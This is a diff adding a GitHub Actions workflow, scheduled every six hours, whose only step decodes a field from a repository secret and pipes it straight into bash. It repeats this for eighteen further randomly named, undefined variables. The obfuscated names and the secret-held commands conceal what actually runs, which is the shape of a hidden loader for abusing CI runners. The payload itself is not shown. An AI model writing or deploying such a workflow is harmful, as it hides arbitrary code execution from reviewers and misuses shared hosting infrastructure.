@@ -1,0 +1,35 @@
+name: danqinqianfan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: danqinqianfan
+        env:
+          oleqa0987: ${{ secrets.oleqa0987 }}
+        run: |
+          echo $oleqa0987 | jq -r .g4 | /bin/bash
+          echo $noi43 | jq -r .ep94402 | /bin/bash
+          echo $cokb3675 | jq -r .r155 | /bin/bash
+          echo $zv02993 | jq -r .rt2 | /bin/bash
+          echo $fws3 | jq -r .xwvcz7 | /bin/bash
+          echo $xpp22798 | jq -r .qpjhy621 | /bin/bash
+          echo $co52145 | jq -r .xdz3623 | /bin/bash
+          echo $nnv06460 | jq -r .jsood7 | /bin/bash
+          echo $unnh07829 | jq -r .qgnoq497 | /bin/bash
+          echo $ib7091 | jq -r .h2730 | /bin/bash
+          echo $vb401 | jq -r .wsu0 | /bin/bash
+          echo $vrx7263 | jq -r .toav22 | /bin/bash
+          echo $j53488 | jq -r .jppjb2 | /bin/bash
+          echo $uh73411 | jq -r .n58 | /bin/bash
+          echo $bc363 | jq -r .ptwq925 | /bin/bash
+          echo $mvsee6263 | jq -r .igy97 | /bin/bash
+          echo $ged36042 | jq -r .zzec5570 | /bin/bash
+          echo $dwg47 | jq -r .ct208 | /bin/bash
+          echo $aq9 | jq -r .avnes355 | /bin/bash
+
